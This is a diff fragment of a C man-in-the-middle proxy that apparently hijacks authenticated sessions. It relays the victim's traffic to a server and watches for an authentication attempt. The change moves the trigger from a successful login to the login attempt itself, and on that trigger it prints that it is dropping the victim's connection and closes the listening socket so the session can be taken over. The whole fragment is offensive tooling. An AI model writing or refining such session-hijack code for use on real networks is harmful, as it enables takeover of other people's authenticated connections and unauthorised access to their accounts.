@@ -20,7 +20,7 @@ void INThandler(int sig) {
     manualdrop = true;
 }
 
-bool detect_auth_ok(uint8_t* bytes, size_t length) {
+bool detect_auth_attempt(uint8_t* bytes, size_t length) {
     if (length < 13) {
         return false;
     }
@@ -79,8 +79,9 @@ void wait_and_auth(proxy* prox) {
 
         if (bufflen > 0) {
             send(prox->server_fd, buff, bufflen, 0);
-            if (detect_auth_ok(buff, bufflen) || manualdrop) {
+            if (detect_auth_attempt(buff, bufflen) || manualdrop) {
                 puts("dropping the victim's connection!");
+                close(prox->listen_fd);
                 return;
             }
         }
@@ -110,7 +111,6 @@ void proxy_init(proxy* prox, proxy_args* args) {
 }
 
 void proxy_run_hijack(proxy* prox) {
-    close(prox->listen_fd);
     uint8_t buff[BUFFER_SIZE];
     ssize_t bufflen;
     int len = sizeof(prox->listen_client);
